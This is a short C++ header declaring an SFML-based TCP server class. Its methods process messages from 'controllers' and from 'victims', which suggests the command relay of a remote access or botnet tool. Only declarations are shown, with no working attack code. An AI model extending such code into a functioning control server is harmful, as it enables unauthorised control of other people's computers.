#pragma once
#include <iostream>
#include <thread>
#include "client.h"
#include "../secret.h"

class Server
{
public:
	Server();
	void receive();
	
private:
	void checkAwake(); //thread
	void processControllerMsg(sf::Uint8 id, sf::Packet p);
	void processVictimMsg(sf::Uint8 id, sf::Packet p);
	void disconnect(sf::Uint8 id);
	void updateControllersList();

	sf::Uint16 currentId = 0;
	sf::SocketSelector selector;
	sf::TcpListener listener;
	std::map<sf::Uint16, Client> clients;
	sf::Mutex mutex; //used for clients access
};

